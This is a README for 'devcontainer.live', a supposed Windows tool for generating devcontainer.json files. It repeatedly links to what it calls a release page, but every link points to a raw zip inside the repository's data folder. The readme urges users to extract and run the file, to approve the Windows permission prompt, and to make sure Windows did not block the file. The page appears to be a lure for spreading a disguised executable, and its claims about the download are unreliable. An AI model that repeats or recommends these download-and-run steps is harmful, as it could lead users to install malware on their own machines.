# 🛠️ devcontainer.live - Build devcontainer files fast

[![Download devcontainer.live](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip)

## 📦 What this app does

devcontainer.live helps you create a `devcontainer.json` file for your project. It gives you a simple way to set up a container-based dev environment without building the file by hand.

Use it to:

- create a new `devcontainer.json`
- set up a project for VS Code
- save time when you need a container config
- keep your dev setup in one place
- reduce mistakes in config files

It is built for people who want a quick way to get a working dev container setup on Windows.

## 💻 Before you download

Use this app on a Windows PC with:

- Windows 10 or Windows 11
- a modern web browser
- a stable internet connection
- enough disk space for the app and your project files

You may also want:

- Visual Studio Code
- Docker Desktop
- a project folder where you want to place the config

If you plan to use the generated config, Docker Desktop should be installed later as well.

## ⬇️ Download

Visit this page to download the app:

[https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip](https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip)

On that page, look for the latest release and download the Windows file. If you see more than one file, pick the one meant for Windows.

## 🪟 Install on Windows

1. Open the release page in your browser.
2. Find the newest release at the top of the list.
3. Download the Windows file for the app.
4. Save the file to your Downloads folder or Desktop.
5. If the file comes as a `.zip`, right-click it and choose Extract All.
6. Open the extracted folder.
7. Double-click the app file to run it.

If Windows asks for permission, choose Yes.

If the app opens in a browser window or desktop window, you are ready to use it.

## 🚀 First run

When you start devcontainer.live for the first time, you will usually see a simple setup screen.

Follow these steps:

1. Open the app.
2. Choose or create a project folder.
3. Select the kind of dev container settings you want.
4. Fill in the basic options for your project.
5. Generate the `devcontainer.json` file.
6. Save the file in your project folder.

If the app also creates related files, place them in the same project folder so VS Code can find them.

## 🧭 How to use it

A dev container setup usually starts with a project folder and a config file. devcontainer.live helps you build that config file without editing raw JSON from scratch.

A simple workflow looks like this:

1. Open your project folder.
2. Start devcontainer.live.
3. Choose the base setup you need.
4. Pick a container image or template.
5. Set the editor and extension options.
6. Generate the config.
7. Open the folder in VS Code.
8. Reopen the folder in a container if needed.

If you are new to containers, think of it like a repeatable project setup. It keeps the same tools and settings ready each time you open the project.

## 🧩 Common setup options

The app may let you choose from settings like these:

- a base image for your project
- the name of the container
- the port to expose
- the extensions to use in VS Code
- the folder to mount in the container
- startup commands
- environment variables
- user settings for the container

These options help you shape the dev environment to fit your project.

## 🖥️ Use with VS Code

devcontainer.live works well with VS Code. After you generate the config:

1. Open VS Code.
2. Open your project folder.
3. Make sure the `devcontainer.json` file is in place.
4. Use the VS Code command for reopening in a container.

This lets VS Code load the project with the settings you created.

If VS Code asks to install the Dev Containers extension, install it first.

## 🐳 Use with Docker

Docker is the engine that runs the container. If Docker is not installed, the config file will not be enough by itself.

For a smooth setup:

1. Install Docker Desktop on Windows.
2. Start Docker Desktop.
3. Wait until it finishes loading.
4. Open your project in VS Code.
5. Reopen the folder in the container.

This keeps your local machine and project setup separate from the container setup.

## 📁 Example project flow

Here is a common way to use devcontainer.live:

1. Create a folder for your project.
2. Open devcontainer.live.
3. Generate a `devcontainer.json`.
4. Add the file to the project folder.
5. Open the folder in VS Code.
6. Start the container.
7. Work inside the container with the same tools each time.

This helps you get a clean setup that you can reuse later.

## 🔧 Troubleshooting

If the app does not open:

- try running it again
- check that the download finished
- make sure the file was extracted if it came as a zip
- confirm that Windows did not block the file
- move the app to a simple folder path, such as `Desktop`

If VS Code does not detect the config:

- check that `devcontainer.json` is in the right folder
- make sure the file name is correct
- open the top-level project folder, not a subfolder
- verify that the Dev Containers extension is installed

If the container does not start:

- make sure Docker Desktop is running
- restart Docker Desktop
- close and reopen VS Code
- check the config for a wrong image name or port setting

If you still have trouble, delete the generated config and create it again with a fresh setup.

## 📝 File names you may see

During setup, you may see files like:

- `devcontainer.json`
- `Dockerfile`
- `docker-compose.yml`
- `.devcontainer/`
- `.vscode/`

These files help define how the project starts in a container and how VS Code connects to it.

## 🌐 Best use cases

devcontainer.live is useful for:

- learning how dev containers work
- making a quick project setup
- preparing a code project for VS Code
- sharing the same setup with others
- keeping tools tied to one project
- reducing setup steps on a new machine

It suits users who want a simple start without hand-editing config files.

## 📌 Tips for a smoother setup

- Keep your project in a short folder path
- Use the latest release from the download page
- Install Docker Desktop before you start the container
- Use VS Code with the Dev Containers extension
- Save generated files in the same project folder
- Keep the folder name clear and simple

## 🧾 What the name means

A dev container is a project environment that runs inside a container. The `devcontainer.json` file tells tools how to build and open that environment.

The name devcontainer.live fits a tool that helps you create that file in a fast, simple way.

## 📥 Download again

If you need the release page again, use this link:

[https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip](https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip)

## 🔎 Project topics

config-generator, container, containers, devcontainer, devcontainers, development, docker, generator, ide, vscode, vue